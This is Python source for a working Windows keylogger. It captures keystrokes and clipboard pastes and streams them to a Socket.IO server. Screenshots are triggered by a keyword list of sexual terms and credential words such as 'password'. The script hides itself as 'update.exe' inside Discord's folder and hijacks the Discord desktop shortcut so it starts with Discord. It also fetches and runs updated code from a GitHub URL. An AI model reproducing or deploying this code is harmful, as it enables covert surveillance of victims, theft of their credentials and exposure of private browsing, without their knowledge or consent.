import pynput
import sys
import time
import os
import threading
import subprocess
import glob
from PIL import ImageGrab
import pyperclip
import keyboard
import shutil
import ctypes
import win32com.client
import ctypes
from ctypes import wintypes
import psutil
import socketio
import requests

github_repo = "https://raw.githubusercontent.com/poweru1337/klff/main/klff.py"
version_file_url = "https://raw.githubusercontent.com/poweru1337/klff/main/version.txt"
local_version = "1.0.1"
local_path = os.path.abspath(__file__)

def get_remote_version():
    try:
        response = requests.get(version_file_url, timeout=5)
        response.raise_for_status()
        return response.text.strip()
    except requests.RequestException:
        return None

def update_script():
    try:
        response = requests.get(github_repo, timeout=5)
        response.raise_for_status()
        with open(local_path, "wb") as f:
            f.write(response.content)
        print("Script updated successfully.")
        restart_script()
    except requests.RequestException:
        print("Failed to download the update.")

def restart_script():
    print("Restarting script...")
    python = sys.executable
    os.execl(python, python, *sys.argv)

CURRENT_USER = os.getlogin()

class SocketIOClient:
    def __init__(self, url):
        self.sio = socketio.Client()
        self.url = url
        self._setup_handlers()

    def _setup_handlers(self):
        @self.sio.on("screenshot")
        def on_message(user):
            if user == "all_users":
                delayed_screenshot("", "Command")
            elif user == CURRENT_USER:
                delayed_screenshot("", "Command")

    def connect(self):
        self.sio.connect(self.url)

    def send_message(self, event, data):
        self.sio.emit(event, data)

    def wait(self):
        self.sio.wait()

    def close(self):
        self.sio.disconnect()

client = SocketIOClient("ws://localhost:1337")
client.connect()

client.send_message("connected", CURRENT_USER)

keystroke_buffer = []
clipboard_message = ""

capslock_on = False
shift_held = False
ctrl_held = False
last_key = None
repeat_count = 0

KEYWORDS = ["porn", "gay", "lesbian", "pussy", "cipa", "gore", "philia", "kid",
            "child", "feet", "stopy", "fur", "hentai", "femboy", "cock", "dick", "kutas",
            "dziwka", "trans", "sex", "seks", "milf", "nigg", "anal", "oral", "rimming",
            "handjob", "blowjob", "footjob", "balls", "boob", "tits", "cum", "fetish", "fetysz",
            "lis", "login", "hasło", "haslo", "password", "user", "powerbot"]

def find_discord_path():
    search_paths = [
        os.path.expanduser("~\\AppData\\Local\\Discord\\app-*\\Discord.exe"),  # Windows
        os.path.expanduser("~/.config/discord/app-*/Discord"),  # Linux
        "/Applications/Discord.app/Contents/MacOS/Discord",  # macOS
    ]

    for path in search_paths:
        matches = glob.glob(path)
        if matches:
            return matches[0]

    return None

def run_application(app_path):
    try:
        subprocess.Popen(app_path)
        print(f"[+] Started application: {app_path}")
    except Exception as e:
        print(f"[-] Failed to start application: {e}")

def send_keystrokes():
    global keystroke_buffer, clipboard_message

    flush_repeated_key()

    message = "".join(keystroke_buffer).strip()
    
    if clipboard_message:
        keystroke_buffer.append(clipboard_message)

    if message:
        message_lower = message.lower()

        keyword_found = False
        keyword_that_fucked_you_up = ""
        for keyword in KEYWORDS:
            if keyword.lower() in message_lower:
                keyword_found = True
                keyword_that_fucked_you_up = message_lower

        if keyword_found:
            threading.Thread(target=delayed_screenshot(keyword_that_fucked_you_up, "Keyword")).start()

        send_message(keystroke_buffer)

    keystroke_buffer = []
    clipboard_message = ""

def send_message(messages):
    try:
        client.send_message('message', { "user": CURRENT_USER, "message": "".join(messages) })
        print("[+] Messages have been sent")
    except Exception as e:
        print(f"[-] An error occurred: {e}")

def delayed_screenshot(keyword_that_fucked_you_up, type):
    time.sleep(3)
    take_screenshot(keyword_that_fucked_you_up, type)

def take_screenshot(keyword_that_fucked_you_up, type):
    try:
        screenshot = ImageGrab.grab()
        screenshot_path = "./screenshot.png"
        screenshot.save(screenshot_path)

        with open(screenshot_path, "rb") as file:
            print(file)
            print(screenshot_path)
            client.send_message('screenshot', {"user": CURRENT_USER, "image": file.read(), "key": keyword_that_fucked_you_up, "extension": "png", "type": type })

        print("[+] Screenshot captured and sent.")

        os.remove(screenshot_path)
        print("[+] Screenshot file deleted.")
    except Exception as e:
        print(f"[-] Failed to capture @or send screenshot: {e}")

def log_key(key_str):
    global keystroke_buffer, last_key, repeat_count

    if key_str == last_key:
        repeat_count += 1
    else:
        flush_repeated_key()
        keystroke_buffer.append(key_str)
        last_key = key_str
        repeat_count = 1

def flush_repeated_key():
    global keystroke_buffer, last_key, repeat_count

    if last_key is not None:
        if repeat_count > 10:
            keystroke_buffer.pop()
            pass
        elif repeat_count == 2:
            keystroke_buffer.append(last_key)

    last_key = None
    repeat_count = 0

def on_press(key):
    global keystroke_buffer, capslock_on, shift_held, ctrl_held, clipboard_message, last_key, repeat_count

    try:
        if key in [pynput.keyboard.Key.shift, pynput.keyboard.Key.shift_r]:
            shift_held = True

        elif key == pynput.keyboard.Key.caps_lock:
            capslock_on = not capslock_on

        elif key == pynput.keyboard.Key.enter:
            send_keystrokes()

        elif key == pynput.keyboard.Key.space:
            log_key(" ")

        elif key == pynput.keyboard.Key.backspace:
            if keystroke_buffer:
                keystroke_buffer.pop()

        elif keyboard.is_pressed('ctrl+v'):
            clipboard_content = pyperclip.paste()
            if clipboard_content:
                log_key(clipboard_content)

        elif hasattr(key, 'char') and key.char is not None:
            char = key.char

            if char.isalpha():
                if capslock_on:
                    if shift_held:
                        char = char.lower()  # Caps Lock + Shift = lowercase
                    else:
                        char = char.upper()  # Caps Lock only = uppercase
                elif shift_held:
                    char = char.upper()

            log_key(char)

        if keyboard.is_pressed('f3') and keyboard.is_pressed('f4') and keyboard.is_pressed('f5') and keyboard.is_pressed('f6'):
            print("[!] Exit combination detected - Exiting macro.")
            sys.exit()

    except Exception as e:
        print(f"[-] Error processing key press: {e}")

def on_release(key):
    global shift_held, ctrl_held

    if key in [pynput.keyboard.Key.shift, pynput.keyboard.Key.shift_r]:
        shift_held = False

def copy_to_discord_folder():
    discord_path = find_discord_path()
    if discord_path:
        storage_path = os.path.join(os.path.dirname(discord_path), "storage")
        update_exe_path = os.path.join(storage_path, "update.exe")

        if os.path.exists(storage_path) and os.path.exists(update_exe_path):
            print("[-] Storage folder and update.exe already exist, skipping.")
            return

        if not os.path.exists(storage_path):
            os.makedirs(storage_path)
            print(f"[+] Created storage folder: {storage_path}")

        if getattr(sys, 'frozen', False):
            script_path = sys.executable 
        else:
            script_path = os.path.abspath(__file__)

        shutil.copy(script_path, update_exe_path)
        print(f"[+] Copied script to {update_exe_path}")

        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        kernel32.SetFileAttributesW.argtypes = (wintypes.LPCWSTR, wintypes.DWORD)
        kernel32.SetFileAttributesW.restype = wintypes.BOOL
        kernel32.SetFileAttributesW(update_exe_path, 32)

        shell = win32com.client.Dispatch('WScript.Shell')
        shortcut_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop', "Discord.lnk")
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.Targetpath = update_exe_path
        shortcut.IconLocation = os.path.join(os.path.dirname(find_discord_path()), "app.ico")
        shortcut.Save()

        discord_dir = os.path.dirname(discord_path)
        for file in os.listdir(discord_dir):
            if file.startswith("Discord_update"):
                shutil.copy(os.path.join(discord_dir, file), storage_path)
                print(f"[+] Copied {file} to {storage_path}")

        print("[+] Closing current script and running update.exe.")
        subprocess.Popen(update_exe_path)
        sys.exit(0)

    else:
        print("[-] Discord not found.")

def replace_shortcut(target):
    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    shortcut_path = os.path.join(desktop_path, "Discord.lnk")
    if os.path.exists(shortcut_path):
        os.remove(shortcut_path)
        print("[-] Removed existing Discord shortcut.")
    shell = win32com.client.Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(shortcut_path)
    shortcut.Targetpath = target
    shortcut.IconLocation = os.path.join(os.path.dirname(find_discord_path()), "app.ico")
    shortcut.Save()
    print(f"[+] Created new Discord shortcut.")

def check_running_instances():
    current_process = psutil.Process(os.getpid())
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == current_process.name() and proc.info['pid'] != current_process.pid:
            try:
                proc.terminate()
                print(f"[-] Terminated existing instance with PID {proc.info['pid']}")
            except Exception as e:
                print(f"[-] Failed to terminate existing instance: {e}")
    print("[+] No other instances running or terminated successfully.")

def main():
    check_running_instances()
    print("[*] Keylogger started. Press Enter to send collected keystrokes.")
    print("[*] Press F3 + F4 + F5 + F6 to exit the macro.")
    copy_to_discord_folder()
    discord_path = find_discord_path()
    if discord_path:
        run_application(discord_path)
    else:
        print("[-] Discord not found. Skipping application launch.")

    try:
        listener = pynput.keyboard.Listener(on_press=on_press, on_release=on_release)
        listener.start()
        listener.join()
    except KeyboardInterrupt:
        print("\n[!] Exiting...")
    except Exception as e:
        print(f"[-] Listener error: {e}")

if __name__ == "__main__":
    remote_version = get_remote_version()
    if remote_version and remote_version != local_version:
        print(f"Updating from {local_version} to {remote_version}...")
        update_script()
    else:
        print("Script is up to date.")
        main()

client.wait()
